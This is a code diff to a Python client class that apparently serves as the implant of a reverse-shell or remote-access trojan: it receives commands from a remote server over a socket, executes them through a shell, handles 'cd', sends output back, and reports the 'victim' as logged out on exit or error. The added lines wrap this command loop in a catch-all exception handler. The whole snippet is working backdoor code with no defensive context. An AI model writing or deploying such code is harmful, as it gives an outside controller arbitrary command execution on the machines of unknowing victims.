@@ -61,20 +61,26 @@ class Client(object):
     def main(self):
         self.connect_to_web_server()
         while True:
-            data = self.client.recv(1024).decode('utf-8')
-            if data == 'quit':
-                print("quitting...")
+            try:
+                data = self.client.recv(1024).decode('utf-8')
+                if data == 'quit':
+                    print("quitting...")
+                    self.update_victim(data={'logged_in': False})
+                    self.client.close()
+                    sys.exit()
+                if data[:2] == 'cd':
+                    os.chdir(data[3:])
+                if len(data) > 0:
+                    command = subprocess.Popen(
+                        data[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
+                    )
+                    output_bytes = command.stdout.read()
+                    output_str = str(output_bytes, "utf-8")
+                    self.client.send(str.encode(str(os.getcwd()) + '$ ' + output_str))
+            except:  # catch *all* exceptions
                 self.client.close()
-                sys.exit()
-            if data[:2] == 'cd':
-                os.chdir(data[3:])
-            if len(data) > 0:
-                command = subprocess.Popen(
-                    data[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
-                )
-                output_bytes = command.stdout.read()
-                output_str = str(output_bytes, "utf-8")
-                self.client.send(str.encode(str(os.getcwd()) + '$ ' + output_str))
+                self.update_victim(data={'logged_in': False})
+                raise
 
 
 if __name__ == '__main__':
